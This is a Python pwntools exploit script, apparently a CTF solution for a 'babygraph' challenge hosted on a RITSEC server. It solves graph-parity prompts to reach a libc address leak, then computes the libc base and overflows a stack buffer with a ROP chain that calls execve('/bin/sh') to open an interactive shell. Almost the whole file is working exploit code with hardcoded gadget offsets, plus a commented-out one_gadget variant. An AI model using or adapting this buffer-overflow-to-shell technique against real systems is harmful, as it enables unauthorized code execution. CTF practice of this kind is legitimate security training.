from pwn import *

p = process("./babygraph")
libc = ELF("./libc.so.6")
p = remote("challenges1.ritsec.club", 1339)
#gdb.attach(p)

for _ in range(5):
    deg = [0] * 10
    p.recvuntil("Here is your baby graph\n")
    v, e = p.readline().strip().split(b' - ')
    v = int(v.split(b' = ')[1])
    e = int(e.split(b' = ')[1])
    for _ in range(e):
        edge = p.readline().strip().split(b' ')
        u = int(edge[0])
        v = int(edge[1])
        # print(u, v)
        deg[u] += 1
        deg[v] += 1
    p.readline()
    solved = False
    for i in range(v):
        if deg[i] % 2:
            p.sendline("N")
            solved = True
            break
    if solved:
        continue
    p.sendline("Y")

leak = p.readline().strip().split(b" ")[-1]
leak = int(leak, 16)
system = leak

libc_address = system - libc.symbols['system']
print("Base address of libc:", hex(libc_address))

# ROPgadet --binary babygraph
# 0x00000000004017c3 : pop rdi ; ret
g = libc.search(b"\x00" * 8)
pop_rdi = 0x00000000004017c3
pop_rdi = libc_address + 0x0000000000026b72
pop_rax = libc_address + 0x000000000004a550
pop_rsi = libc_address + 0x0000000000027529
pop_rdx = libc_address + 0x000000000011c371
syscall = libc_address + 0x000000000002584d
ret = libc_address + 0x0000000000025679

bin_sh = libc_address + 0x1b75aa
print("Address of /bin/sh:", hex(bin_sh))

rop_chain = [
    pop_rdi, bin_sh,
    ret, system
]

rop_chain = [
    pop_rax, 59,
    pop_rdi, bin_sh,
    pop_rsi, bin_sh,
    pop_rdx, 0,
    ret, syscall
]
rop_chain = b''.join([p64(r) for r in rop_chain])
print(len(rop_chain))

payload = b"A" * 120 
payload += rop_chain
print(payload)
#input()
p.sendline(payload)
# p.sendline("ls")
p.interactive()

# print("system @ " + hex(leak))
# libc_base = leak - libc.symbols['system']
# print(hex(libc_base))

# # onegadget = libc_base + 0xe6c7e
# onegadget = libc_base + 0xe6c81
# # onegadget = libc_base + 0xe6c84
# # input()
# payload = b"A" * 120 + p64(onegadget)
# p.sendline(payload)
# p.interactive()